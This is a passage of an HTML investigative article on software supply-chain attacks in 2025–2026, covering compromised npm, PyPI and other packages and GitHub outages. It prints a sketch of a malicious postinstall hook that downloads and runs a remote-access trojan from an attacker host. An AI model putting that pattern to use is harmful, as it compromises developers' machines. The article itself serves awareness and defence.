@@ -1,0 +1,848 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>The Developer Infrastructure Is on Fire: GitHub Outages, npm Breaches, and the Crisis Nobody Prepared For</title>
+<meta property="og:title" content="The Developer Infrastructure Is on Fire: GitHub Outages, npm Breaches, and the Crisis Nobody Prepared For" />
+<meta property="og:description" content="257 GitHub incidents in one year. Axios backdoored by North Korea. TanStack hijacked in 6 minutes. The tools you trust with your code are under siege - and most developers have no idea." />
+<meta property="og:type" content="article" />
+<meta property="og:image" content="https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=1200&h=630&fit=crop" />
+<meta name="author" content="Divyansh Singh" />
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,700;0,900;1,400;1,700&family=DM+Sans:wght@300;400;500&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet" />
+<style>
+  :root {
+    --ink: #0f0e0c;
+    --paper: #f5f0e8;
+    --accent: #c84b31;
+    --accent2: #2a6e4a;
+    --muted: #8a8275;
+    --rule: #d4cdc0;
+    --highlight: #fff3b0;
+    --code-bg: #1e1e1e;
+    --code-text: #d4d4d4;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    font-family: 'DM Sans', sans-serif;
+    background: var(--paper);
+    color: var(--ink);
+    font-size: 17px;
+    line-height: 1.75;
+    overflow-x: hidden;
+  }
+
+  /* MASTHEAD */
+  .masthead {
+    background: var(--ink);
+    color: var(--paper);
+    text-align: center;
+    padding: 12px 24px;
+    font-family: 'DM Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 0.18em;
+    text-transform: uppercase;
+  }
+
+  /* COVER IMAGE */
+  .cover-image {
+    width: 100%;
+    max-height: 420px;
+    object-fit: cover;
+    display: block;
+  }
+
+  /* HERO */
+  .hero {
+    max-width: 860px;
+    margin: 0 auto;
+    padding: 64px 32px 40px;
+    border-bottom: 2px solid var(--ink);
+  }
+
+  .hero-label {
+    font-family: 'DM Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--accent);
+    margin-bottom: 20px;
+  }
+
+  .hero h1 {
+    font-family: 'Playfair Display', serif;
+    font-size: clamp(2.4rem, 5vw, 4rem);
+    font-weight: 900;
+    line-height: 1.08;
+    letter-spacing: -0.02em;
+    margin-bottom: 24px;
+  }
+
+  .hero h1 em {
+    font-style: italic;
+    color: var(--accent);
+  }
+
+  .hero-sub {
+    font-size: 1.15rem;
+    color: var(--muted);
+    max-width: 640px;
+    line-height: 1.6;
+    margin-bottom: 32px;
+    font-weight: 300;
+  }
+
+  .byline {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    font-family: 'DM Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+    color: var(--muted);
+    border-top: 1px solid var(--rule);
+    padding-top: 20px;
+    flex-wrap: wrap;
+  }
+
+  .byline-dot {
+    width: 4px; height: 4px;
+    border-radius: 50%;
+    background: var(--rule);
+  }
+
+  /* LAYOUT */
+  .content-wrap {
+    max-width: 860px;
+    margin: 0 auto;
+    padding: 0 32px;
+  }
+
+  /* SECTIONS */
+  section {
+    padding: 52px 0;
+    border-bottom: 1px solid var(--rule);
+  }
+  section:last-child { border-bottom: none; }
+
+  .section-num {
+    font-family: 'DM Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 0.25em;
+    text-transform: uppercase;
+    color: var(--muted);
+    margin-bottom: 10px;
+  }
+
+  h2 {
+    font-family: 'Playfair Display', serif;
+    font-size: 1.9rem;
+    font-weight: 700;
+    line-height: 1.2;
+    margin-bottom: 24px;
+    letter-spacing: -0.01em;
+  }
+
+  h3 {
+    font-family: 'Playfair Display', serif;
+    font-size: 1.25rem;
+    font-weight: 700;
+    margin: 32px 0 12px;
+    font-style: italic;
+  }
+
+  p { margin-bottom: 18px; }
+  p:last-child { margin-bottom: 0; }
+
+  strong { font-weight: 500; }
+
+  /* PULL QUOTE */
+  .pull-quote {
+    border-left: 4px solid var(--accent);
+    padding: 4px 0 4px 28px;
+    margin: 36px 0;
+  }
+  .pull-quote p {
+    font-family: 'Playfair Display', serif;
+    font-size: 1.35rem;
+    font-style: italic;
+    line-height: 1.45;
+    color: var(--ink);
+    margin: 0;
+  }
+
+  /* CALLOUT BOX */
+  .callout {
+    background: var(--ink);
+    color: var(--paper);
+    border-radius: 4px;
+    padding: 28px 32px;
+    margin: 32px 0;
+  }
+  .callout .callout-label {
+    font-family: 'DM Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--accent);
+    margin-bottom: 10px;
+  }
+  .callout p {
+    font-size: 0.95rem;
+    line-height: 1.7;
+    color: #d8d2c6;
+    margin-bottom: 10px;
+  }
+  .callout p:last-child { margin-bottom: 0; }
+
+  /* HIGHLIGHT BOX */
+  .highlight-box {
+    background: var(--highlight);
+    border: 1px solid #e0d06a;
+    border-radius: 4px;
+    padding: 20px 24px;
+    margin: 28px 0;
+    font-size: 0.93rem;
+  }
+  .highlight-box strong {
+    display: block;
+    font-family: 'DM Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 0.18em;
+    text-transform: uppercase;
+    margin-bottom: 8px;
+    color: #7a6a00;
+  }
+
+  /* CODE BLOCK */
+  .code-block {
+    background: var(--code-bg);
+    border-radius: 6px;
+    padding: 24px 28px;
+    margin: 28px 0;
+    overflow-x: auto;
+  }
+  .code-block .code-label {
+    font-family: 'DM Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 0.18em;
+    text-transform: uppercase;
+    color: #6a9955;
+    margin-bottom: 14px;
+  }
+  .code-block pre {
+    font-family: 'DM Mono', monospace;
+    font-size: 12.5px;
+    line-height: 1.7;
+    color: var(--code-text);
+    white-space: pre;
+  }
+  .code-kw  { color: #569cd6; }
+  .code-fn  { color: #dcdcaa; }
+  .code-str { color: #ce9178; }
+  .code-cmt { color: #6a9955; font-style: italic; }
+  .code-num { color: #b5cea8; }
+  .code-var { color: #9cdcfe; }
+
+  /* ARCHITECTURE DIAGRAM */
+  .arch-diagram {
+    background: #fff;
+    border: 1px solid var(--rule);
+    border-radius: 6px;
+    padding: 32px;
+    margin: 32px 0;
+    font-family: 'DM Mono', monospace;
+    font-size: 12px;
+    overflow-x: auto;
+  }
+  .arch-title {
+    font-size: 10px;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--muted);
+    margin-bottom: 24px;
+  }
+
+  /* FLOW NODES */
+  .flow-track {
+    display: flex;
+    flex-direction: column;
+    gap: 0;
+    margin: 8px 0;
+  }
+  .flow {
+    display: flex;
+    flex-wrap: nowrap;
+    align-items: center;
+    margin: 0;
+    padding: 0;
+  }
+  .flow-node {
+    background: var(--ink);
+    color: var(--paper);
+    padding: 14px 22px;
+    border-radius: 8px;
+    font-family: 'DM Mono', monospace;
+    font-size: 12px;
+    font-weight: 500;
+    white-space: nowrap;
+    flex-shrink: 0;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+    letter-spacing: 0.01em;
+  }
+  .flow-node.green  { background: var(--accent2); }
+  .flow-node.red    { background: var(--accent); }
+  .flow-node.muted  { background: var(--muted); }
+  .flow-arrow {
+    display: flex;
+    align-items: center;
+    flex-shrink: 0;
+    margin: 0 6px;
+    width: 32px;
+    height: 14px;
+    position: relative;
+    font-size: 0;
+    color: transparent;
+    overflow: visible;
+  }
+  .flow-arrow::before {
+    content: '';
+    position: absolute;
+    left: 0;
+    right: 8px;
+    top: 50%;
+    transform: translateY(-50%);
+    height: 2px;
+    background: var(--rule);
+  }
+  .flow-arrow::after {
+    content: '';
+    position: absolute;
+    right: 0;
+    top: 50%;
+    transform: translateY(-50%);
+    width: 0;
+    height: 0;
+    border-top: 5px solid transparent;
+    border-bottom: 5px solid transparent;
+    border-left: 8px solid var(--rule);
+  }
+  .flow-bend {
+    display: flex;
+    align-items: center;
+    padding: 0;
+    margin-left: 40px;
+    height: 24px;
+    position: relative;
+  }
+  .flow-bend::before {
+    content: '';
+    position: absolute;
+    left: 0;
+    top: 0;
+    width: 2px;
+    height: 100%;
+    background: var(--rule);
+  }
+  .flow-bend::after {
+    content: '';
+    position: absolute;
+    left: -4px;
+    bottom: -1px;
+    width: 0;
+    height: 0;
+    border-left: 5px solid transparent;
+    border-right: 5px solid transparent;
+    border-top: 8px solid var(--rule);
+  }
+
+  /* NUMBERED LIST */
+  ol.styled {
+    counter-reset: item;
+    list-style: none;
+    margin: 20px 0;
+    padding: 0;
+  }
+  ol.styled li {
+    counter-increment: item;
+    display: flex;
+    gap: 16px;
+    margin-bottom: 18px;
+    align-items: flex-start;
+  }
+  ol.styled li::before {
+    content: counter(item, decimal-leading-zero);
+    font-family: 'DM Mono', monospace;
+    font-size: 11px;
+    color: var(--accent);
+    min-width: 28px;
+    padding-top: 3px;
+  }
+
+  /* STAT STRIP */
+  .stat-strip {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+    gap: 1px;
+    background: var(--rule);
+    border: 1px solid var(--rule);
+    border-radius: 4px;
+    overflow: hidden;
+    margin: 32px 0;
+  }
+  .stat-item {
+    background: #fff;
+    padding: 20px 20px;
+    text-align: center;
+  }
+  .stat-num {
+    font-family: 'Playfair Display', serif;
+    font-size: 2.2rem;
+    font-weight: 900;
+    color: var(--accent);
+    line-height: 1;
+    margin-bottom: 6px;
+  }
+  .stat-label {
+    font-family: 'DM Mono', monospace;
+    font-size: 9.5px;
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    color: var(--muted);
+    line-height: 1.3;
+  }
+
+  /* TAG */
+  .tag {
+    display: inline-block;
+    background: var(--rule);
+    font-family: 'DM Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+    padding: 3px 9px;
+    border-radius: 2px;
+    margin: 2px 3px 2px 0;
+    color: var(--muted);
+  }
+  .tag.green { background: #d4ede0; color: var(--accent2); }
+  .tag.red   { background: #fde8e3; color: var(--accent); }
+
+  /* DIVIDER */
+  .ornament {
+    text-align: center;
+    color: var(--muted);
+    font-size: 1.4rem;
+    letter-spacing: 0.5em;
+    padding: 8px 0;
+  }
+
+  /* FOOTNOTE */
+  .footnote {
+    font-size: 0.82rem;
+    color: var(--muted);
+    font-style: italic;
+    border-top: 1px solid var(--rule);
+    padding-top: 16px;
+    margin-top: 40px;
+  }
+
+  /* RESPONSIVE */
+  @media (max-width: 600px) {
+    .hero, .content-wrap { padding-left: 20px; padding-right: 20px; }
+    .flow { flex-direction: column; align-items: flex-start; }
+    .flow-arrow {
+      transform: rotate(90deg);
+      margin: 6px 0 6px 12px;
+    }
+    .flow-bend { margin-left: 12px; display: none; }
+    .flow-track .flow { margin-top: 0; }
+  }
+</style>
+</head>
+<body>
+
+<div class="masthead">Security &nbsp;&middot;&nbsp; Supply Chain &nbsp;&middot;&nbsp; Developer Infrastructure</div>
+
+<img class="cover-image" src="https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=1200&h=420&fit=crop" alt="Matrix-style digital rain representing developer infrastructure under siege" />
+
+<!-- HERO -->
+<div class="hero">
+  <div class="hero-label">Investigation &middot; Infrastructure Security</div>
+  <h1>The Developer Infrastructure Is on Fire: GitHub Outages, npm Breaches, and the <em>Crisis Nobody Prepared For</em></h1>
+  <p class="hero-sub">257 GitHub incidents in one year. Axios backdoored by North Korea. TanStack hijacked in 6 minutes. A self-replicating worm loose in the npm registry. The tools you trust with your code are under siege - and most developers have no idea how bad it has actually gotten.</p>
+  <div class="byline">
+    <span>By Divyansh Singh</span>
+    <span class="byline-dot"></span>
+    <span>May 2026</span>
+    <span class="byline-dot"></span>
+    <span>~14 min read</span>
+    <span class="byline-dot"></span>
+    <span class="tag red">Security</span>
+    <span class="tag">Supply Chain</span>
+    <span class="tag">npm</span>
+  </div>
+</div>
+
+<!-- ARTICLE BODY -->
+<div class="content-wrap">
+
+  <!-- 01. THE MOMENT -->
+  <section>
+    <div class="section-num">01 &middot; The Moment</div>
+    <h2>Something Broke Last Week. And the Week Before That. And the Week Before That.</h2>
+    <p>If you have been a working developer at any point in the last twelve months, you have probably experienced this: you push code, your CI pipeline stalls, you check GitHub Status, and there it is - another yellow banner. "We are investigating reports of degraded performance for GitHub Actions." You sigh, grab a coffee, and wait it out. Maybe you post a mildly sarcastic message in your team's Slack channel. Then you move on.</p>
+    <p>But here is the thing nobody seems to be talking about loudly enough: this is not an occasional hiccup anymore. Between May 2025 and April 2026, GitHub logged <strong>257 incidents</strong>, of which <strong>48 were classified as major outages</strong>. That is roughly five incidents per week. February 2026 alone had 37 incidents - more than one a day.</p>
+    <p>And GitHub's reliability crisis is not even the scariest part of this story.</p>
+    <p>While GitHub was busy going down every other Tuesday, the npm registry - the package ecosystem that underpins virtually every JavaScript project on the planet - was getting systematically infiltrated. Not by script kiddies uploading joke packages. By <strong>nation-state actors deploying RATs through packages you already have in your lockfile</strong>. By a literal self-replicating worm that infected over 500 packages. By attackers who compromised Axios - yes, that Axios, the one with 50 million weekly downloads - and published backdoored versions within a 39-minute window.</p>
+    <p>This article is my attempt to lay out the full picture. Because when you see these incidents individually, they look like isolated bad luck. When you see them together, they look like something much worse: a systematic failure of the infrastructure that modern software development depends on.</p>
+
+    <div class="pull-quote">
+      <p>"We treated package registries like public utilities - always on, always safe. Turns out, they are more like unlocked houses on a busy street."</p>
+    </div>
+  </section>
+
+  <!-- 02. GITHUB -->
+  <section>
+    <div class="section-num">02 &middot; GitHub's Year From Hell</div>
+    <h2>257 Incidents, 48 Major Outages, and an Expired TLS Certificate</h2>
+    <p>Let me walk you through what has actually been happening at GitHub, because the individual incidents tell a story that the status page does not.</p>
+    <p><strong>November 18, 2025:</strong> All Git operations failed globally. The root cause? An <strong>expired TLS certificate</strong> used for internal service-to-service communication. The kind of thing that should never happen at a company with Microsoft's resources. The outage lasted over an hour.</p>
+    <p><strong>February 9, 2026:</strong> An overloaded database cluster responsible for authentication and user management went down. A configuration change triggered excessive background processing that overwhelmed the cluster. If you could not log in to GitHub that day, this was why.</p>
+    <p><strong>February 12, 2026:</strong> Codespaces creation and resume failures across Europe, Asia, and Australia - <strong>peaking at a 90% failure rate</strong> - caused by a bad configuration rollout in a core networking dependency. Nine hours to resolve.</p>
+    <p><strong>April 23, 2026:</strong> This one is genuinely terrifying. A <strong>Merge Queue bug</strong> caused merge groups containing more than one PR to produce incorrect commits. The merged code silently deleted changes from other PRs in the same group. Think about that for a moment. Your code, merged and deployed, but with chunks silently removed. No error. No warning.</p>
+    <p><strong>April 28, 2026:</strong> Pull requests vanished from search results because someone ran a repair job without the required safety flags. On the same day, a <strong>critical RCE vulnerability (CVE-2026-3854)</strong> in the git push pipeline was publicly disclosed.</p>
+
+    <div class="stat-strip">
+      <div class="stat-item">
+        <div class="stat-num">257</div>
+        <div class="stat-label">Total Incidents<br/>May 2025 - Apr 2026</div>
+      </div>
+      <div class="stat-item">
+        <div class="stat-num">48</div>
+        <div class="stat-label">Major Outages<br/>in 12 Months</div>
+      </div>
+      <div class="stat-item">
+        <div class="stat-num">37</div>
+        <div class="stat-label">Incidents in<br/>February 2026</div>
+      </div>
+      <div class="stat-item">
+        <div class="stat-num">57</div>
+        <div class="stat-label">GitHub Actions<br/>Outages Alone</div>
+      </div>
+    </div>
+
+    <p>GitHub Actions was the most affected service with 57 outages (16 major). Copilot had 44 outages, including 10 in February alone. GitHub's own CTO, Vlad Fedorov, published a blog post on April 28 admitting to "rapid load growth, architectural coupling that allowed localised issues to cascade across critical services, and inability of the system to adequately shed load from misbehaving clients."</p>
+    <p>The root cause, in plain English: GitHub was not built for the scale it now faces. Since late December 2025, <strong>agentic AI development workflows have accelerated sharply</strong> - AI coding assistants like Copilot, Cursor, Windsurf, and autonomous agents running through GitHub Actions are generating a volume of API calls, pushes, and CI runs that the platform never anticipated. They started a 10X capacity plan in October 2025. By February 2026, they realised they needed to design for <strong>30X</strong>. The AI tools we adopted to write code faster are, ironically, breaking the infrastructure we use to ship it.</p>
+  </section>
+
+  <!-- 03. AXIOS -->
+  <section>
+    <div class="section-num">03 &middot; The Axios Attack</div>
+    <h2>North Korea Backdoored the Most Popular HTTP Client on npm</h2>
+    <p>On March 30, 2026, at some point during a 39-minute window, someone published two backdoored versions of Axios to npm: <strong>1.14.1</strong> and <strong>0.30.4</strong>. The attacker had gained control of an npm account belonging to jasonsaayman, a primary maintainer of the project.</p>
+    <p>The malicious versions introduced a new dependency called <strong>plain-crypto-js</strong>. Innocuous name. The kind of package name you would scroll past in a diff review without blinking. But its postinstall hook silently downloaded platform-specific stage-2 RAT implants from an attacker-controlled server.</p>
+
+    <div class="code-block">
+      <div class="code-label">What the malicious postinstall hook actually did</div>
+      <pre><span class="code-cmt">// plain-crypto-js/postinstall.js (simplified reconstruction)</span>
+<span class="code-kw">const</span> <span class="code-var">os</span> = <span class="code-fn">require</span>(<span class="code-str">'os'</span>);
+<span class="code-kw">const</span> <span class="code-var">https</span> = <span class="code-fn">require</span>(<span class="code-str">'https'</span>);
+<span class="code-kw">const</span> <span class="code-var">fs</span> = <span class="code-fn">require</span>(<span class="code-str">'fs'</span>);
+<span class="code-kw">const</span> <span class="code-var">{ execSync }</span> = <span class="code-fn">require</span>(<span class="code-str">'child_process'</span>);
+
+<span class="code-kw">const</span> <span class="code-var">platform</span> = <span class="code-var">os</span>.<span class="code-fn">platform</span>();
+<span class="code-kw">const</span> <span class="code-var">payloadUrl</span> = <span class="code-str">`sfrclak[.]com:8000/${platform}/stage2`</span>;
+
+<span class="code-cmt">// Downloads a platform-specific RAT binary</span>
+<span class="code-cmt">// macOS, Windows, and Linux all targeted</span>
+<span class="code-cmt">// Binary persists itself and phones home to C2 server</span>
+<span class="code-fn">downloadAndExecute</span>(<span class="code-var">payloadUrl</span>);</pre>
+    </div>
+
+    <p>The RAT deployed on macOS, Windows, and Linux. Within those three hours before the malicious versions were yanked, Huntress observed <strong>at least 135 endpoints</strong> actively contacting the attacker's command-and-control server. Microsoft Threat Intelligence attributed the attack to <strong>Sapphire Sleet, a North Korean state actor</strong>.</p>
+    <p>Read that again. A state-sponsored hacking group from North Korea compromised the most widely used HTTP library in the JavaScript ecosystem. CISA - the United States Cybersecurity and Infrastructure Security Agency - published a formal alert about it on April 20, 2026.</p>
+    <p>Axios has roughly 50 million weekly downloads. If you run a JavaScript project of any meaningful size, there is a very good chance it is in your dependency tree somewhere. And for 39 minutes on a random Sunday, installing it would have given North Korean hackers a backdoor into your machine.</p>
+
+    <div class="callout">
+      <div class="callout-label">How did they get in?</div>
+      <p>The attacker compromised a maintainer's npm account. Not through a zero-day exploit. Not through some sophisticated supply chain inception. Through <strong>credential theft</strong>. The same basic attack vector that security teams have been warning about for years. npm does not enforce hardware-key-based 2FA for package maintainers. It offers it. It does not require it. That gap between "available" and "enforced" is where Sapphire Sleet walked right in.</p>
+    </div>
+  </section>
+
+  <!-- 04. TANSTACK -->
+  <section>
+    <div class="section-num">04 &middot; The TanStack Hijack</div>
+    <h2>84 Malicious Packages in 6 Minutes</h2>
+    <p>This one happened just two days ago, on May 11, 2026. Between 19:20 and 19:26 UTC - a window of six minutes - <strong>84 malicious npm package artifacts</strong> were published across <strong>42 packages</strong> in the @tanstack namespace.</p>
+    <p>If you are a React developer, you almost certainly use TanStack. TanStack Query (formerly React Query) is one of the most popular data-fetching libraries in the ecosystem. TanStack Router, TanStack Table, TanStack Form - these are not obscure packages. They are foundational tools used in production by thousands of companies.</p>
+    <p>The attack vector here was different from Axios. The attacker did not steal a maintainer's credentials. Instead, they hijacked the build pipeline itself. The malicious code was published using TanStack's own trusted OIDC identity after attacker-controlled code took over the CI runner mid-workflow. The packages were published through the <strong>legitimate automation pipeline</strong>, which means any automated verification that checks "was this published by the official TanStack CI?" would have said yes.</p>
+    <p>Six minutes. Forty-two packages. And the whole thing sailed through the existing trust model because the trust model was built on the assumption that CI pipelines are secure.</p>
+
+    <div class="highlight-box">
+      <strong>Why this matters more than it seems</strong>
+      The TanStack attack did not compromise a maintainer's password. It compromised the <em>build system's identity</em>. This means lockfiles, pinned versions, and "only install from trusted publishers" policies would not have protected you. The publisher was trusted. The identity was legitimate. The code was malicious. Traditional supply chain defences are not designed for this threat model.
+    </div>
+  </section>
+
+  <!-- 05. SHAI-HULUD -->
+  <section>
+    <div class="section-num">05 &middot; The Worm</div>
+    <h2>Shai-Hulud: The Self-Replicating npm Worm That Will Not Die</h2>
+    <p>And then there is the one that keeps me up at night.</p>
+    <p>In September 2025, security researchers at Socket disclosed a self-replicating worm - codenamed <strong>Shai-Hulud</strong> after the sandworms from Dune - that was actively spreading through the npm ecosystem. Not a malicious package. A <em>worm</em>. One that automated the compromise and redistribution of other packages, spreading itself across the registry without human intervention.</p>
+    <p>Wave 1 infected <strong>over 500 npm packages</strong>, including @ctrl/tinycolor (around 2 million weekly downloads). It scanned victim environments for GitHub tokens, exfiltrated secrets, and used those tokens to compromise more packages. CISA published an alert on September 23, 2025, calling it a "widespread supply chain compromise."</p>
+    <p>Wave 2 hit in November 2025. Significantly wider in scope. It affected <strong>25,000+ malicious GitHub repositories</strong> across roughly 350 unique users. Compromised versions were uploaded between November 21-23.</p>
+    <p>Wave 3 arrived on April 22, 2026. Wave 4 - dubbed "Mini Shai-Hulud" - hit on April 29, 2026, this time targeting SAP's npm packages. The affected packages included @cap-js/sqlite, @cap-js/postgres, @cap-js/db-service, and mbt. The malicious payload downloaded the Bun runtime, then executed an obfuscated script that stole credentials from Chrome, Safari, Edge, and Brave browsers, queried Kubernetes and Vault secrets, and used regex to extract AWS keys, GitHub tokens, npm tokens, database connection strings, and private keys.</p>
+
+    <div class="pull-quote">
+      <p>"This is not a package with malware in it. This is malware that publishes packages. The distinction matters enormously."</p>
+    </div>
+
+    <p>Four waves. Nine months. Each one more sophisticated than the last. And the fundamental vulnerability it exploits - stolen tokens granting publish access - has not been structurally addressed by any registry.</p>
+  </section>
+
+  <!-- 06. CHALK -->
+  <section>
+    <div class="section-num">06 &middot; The Chalk Incident</div>
+    <h2>2 Billion Weekly Downloads Compromised Through a Phishing Email</h2>
+    <p>On September 8, 2025, eighteen popular npm packages were compromised simultaneously. The list included <strong>chalk</strong>, <strong>debug</strong>, and <strong>ansi-styles</strong> - packages that collectively receive <strong>over 2 billion downloads per week</strong>. If you have ever run a Node.js application, these packages are almost certainly in your dependency tree.</p>
+    <p>The attack was disturbingly simple. A maintainer received a convincing 2FA reset email from a fake domain - npmjs.help instead of npmjs.com. The phishing page collected their username, password, and a live TOTP code. That was it. No zero-day. No sophisticated exploit chain. A well-crafted email and a fake login page.</p>
+    <p>The malicious payload was a cryptostealer targeting Bitcoin, Solana, and Ethereum transactions. It rewrote HTTP responses to redirect cryptocurrency transactions to the attacker's wallet addresses. The malicious versions were live for roughly two hours before detection and removal.</p>
+    <p>Two hours. Two billion weekly downloads. Eighteen packages. One phishing email.</p>
+
+    <div class="callout">
+      <div class="callout-label">The uncomfortable arithmetic</div>
+      <p>chalk alone has around 75 million weekly downloads. In a two-hour window, that translates to roughly 900,000 potential installs of the compromised version. Not all of those would have been fresh installs - many would have been served from cache or matched a lockfile. But even if 1% were fresh installs, that is 9,000 developer machines potentially running a cryptostealer. From a single phishing email.</p>
+    </div>
+  </section>
+
+  <!-- 07. BEYOND NPM -->
+  <section>
+    <div class="section-num">07 &middot; Beyond npm</div>
+    <h2>It Is Not Just JavaScript. Every Ecosystem Is Getting Hit.</h2>
+    <p>If you are reading this and thinking "well, I use Python, so this does not affect me" - I have bad news.</p>
+
+    <h3>PyPI</h3>
+    <p>In March 2026, TeamPCP - the same group behind the Shai-Hulud worm - compromised <strong>LiteLLM</strong>, a popular Python package for working with large language models. They obtained the maintainer's PyPI credentials through a prior compromise of Aqua Security's Trivy vulnerability scanner (the irony is not lost on anyone) and published malicious versions that harvested environment variables, SSH keys, cloud credentials, Kubernetes data, Docker configs, shell history, and database credentials.</p>
+    <p>On April 30, 2026, <strong>PyTorch Lightning</strong> was hit. Malicious releases of the lightning package (versions 2.6.2 and 2.6.3) included a hidden _runtime directory with an obfuscated JavaScript payload. In May 2026, Microsoft began investigating a compromise of the <strong>mistralai</strong> PyPI package.</p>
+
+    <h3>Docker Hub</h3>
+    <p>On April 22, 2026, Checkmarx's KICS Docker images were compromised. The attacker pushed malicious images using valid publisher credentials, overwriting existing tags. And in November 2025, researchers found <strong>over 10,000 Docker Hub images containing leaked production credentials</strong> from 100+ organisations, including a Fortune 500 company and a national central bank.</p>
+
+    <h3>VS Code Extensions</h3>
+    <p>Detections of malicious VS Code extensions grew from 27 in 2024 to <strong>105 in the first 10 months of 2025</strong>. In April 2026, GlassWorm v2 planted 73 cloned malicious extensions. One fake Prettier extension delivered a multi-stage chain ending with a full remote access trojan.</p>
+
+    <h3>Rust (crates.io)</h3>
+    <p>Malicious crates targeting Solana and Ethereum private keys were discovered in May 2025. Phishing campaigns impersonating the Rust Foundation targeted crates.io users in September 2025. And in early 2026, malicious crates were found impersonating time-related APIs to steal .env file contents.</p>
+
+    <h3>GitHub Actions</h3>
+    <p>In March 2025, the widely-used <strong>tj-actions/changed-files</strong> Action - used in 23,000+ repositories - was compromised. The attacker pushed a malicious commit disguised as coming from renovate[bot] that printed all CI runner credentials to workflow logs. All existing version tags were retagged to point to the malicious commit. CVE-2025-30066, CVSS 8.6.</p>
+
+    <div class="stat-strip">
+      <div class="stat-item">
+        <div class="stat-num">1.2M</div>
+        <div class="stat-label">Known Malicious<br/>Packages (Cumulative)</div>
+      </div>
+      <div class="stat-item">
+        <div class="stat-num">454K+</div>
+        <div class="stat-label">New Malicious Packages<br/>in 2025 Alone</div>
+      </div>
+      <div class="stat-item">
+        <div class="stat-num">99%+</div>
+        <div class="stat-label">of Open Source Malware<br/>Found on npm</div>
+      </div>
+      <div class="stat-item">
+        <div class="stat-num">75%</div>
+        <div class="stat-label">Year-over-Year<br/>Malware Growth</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 08. THE ATTACK SURFACE -->
+  <section>
+    <div class="section-num">08 &middot; The Attack Surface</div>
+    <h2>How a Modern npm Install Actually Exposes You</h2>
+    <p>Let me show you what actually happens when you run <code>npm install</code> on a typical React project, because I think most developers vastly underestimate the surface area they are trusting.</p>
+
+    <div class="arch-diagram">
+      <div class="arch-title">Attack Surface Diagram &middot; npm install on a typical React project</div>
+      <div class="flow-track">
+        <div class="flow">
+          <div class="flow-node green">npm install</div>
+          <div class="flow-arrow"></div>
+          <div class="flow-node">Resolve 800-1200<br/>packages</div>
+          <div class="flow-arrow"></div>
+          <div class="flow-node red">Execute postinstall<br/>hooks (arbitrary code)</div>
+        </div>
+        <div class="flow-bend"></div>
+        <div class="flow">
+          <div class="flow-node">Access to filesystem,<br/>network, env vars</div>
+          <div class="flow-arrow"></div>
+          <div class="flow-node red">Potential exfiltration<br/>of secrets, tokens, keys</div>
+        </div>
+        <div class="flow-bend"></div>
+        <div class="flow">
+          <div class="flow-node muted">All of this happens<br/>before your code runs</div>
+        </div>
+      </div>
+    </div>
+
+    <p>A typical React application pulls in somewhere between 800 and 1,200 transitive dependencies. Each of those packages can have a postinstall script that runs arbitrary code on your machine with your user's full permissions. It can read your environment variables, access your filesystem, make network requests, and execute child processes. And this all happens automatically, silently, as part of <code>npm install</code>.</p>
+    <p>You are not just trusting the 15 or 20 packages in your package.json. You are trusting every maintainer of every transitive dependency, every CI pipeline that publishes those packages, every npm account that has publish rights, and the security of every single credential in that chain.</p>
+
+    <div class="code-block">
+      <div class="code-label">How many maintainers are you trusting right now?</div>
+      <pre><span class="code-cmt"># Run this in any Node.js project to see your actual exposure</span>
+<span class="code-fn">npm</span> ls --all --parseable 2>/dev/null | wc -l
+<span class="code-cmt"># Typical React app: 800-1200 packages</span>
+
+<span class="code-cmt"># Check for postinstall scripts in your dependencies</span>
+<span class="code-fn">find</span> node_modules -name "package.json" -maxdepth 3 \
+  -exec <span class="code-fn">grep</span> -l <span class="code-str">"postinstall"</span> {} \;
+<span class="code-cmt"># You will be surprised how many there are</span>
+
+<span class="code-cmt"># Check if any dependency has changed its publishing identity</span>
+<span class="code-fn">npm</span> audit signatures
+<span class="code-cmt"># If you see warnings here, investigate immediately</span></pre>
+    </div>
+
+    <p>The uncomfortable truth is that <code>npm install</code> is the most dangerous command most developers run on a daily basis. It executes untrusted code from the internet with full access to your development environment. We just normalised it years ago and stopped thinking about it.</p>
+  </section>
+
+  <!-- 09. WHY LOCKFILES WON'T SAVE YOU -->
+  <section>
+    <div class="section-num">09 &middot; Broken Assumptions</div>
+    <h2>Why Your Lockfile, Pinned Versions, and Audit Command Are Not Enough</h2>
+    <p>I keep seeing developers respond to these incidents with the same handful of defences. "I use a lockfile." "I pin exact versions." "I run npm audit." Let me explain why none of these would have protected you from the attacks described above.</p>
+
+    <h3>Lockfiles</h3>
+    <p>Your lockfile pins the exact version of every package in your tree. That is great for reproducibility. But when Axios 1.14.1 was published with a backdoor, that <em>was</em> a new version. If your lockfile said 1.14.0 and you never ran npm install during those 39 minutes, you were fine. But if you ran <code>npm install</code> on a fresh checkout, or if your CI pipeline did a clean install, or if any developer on your team updated axios during that window, your lockfile now contains the compromised version. And it will faithfully install it every time thereafter.</p>
+
+    <h3>npm audit</h3>
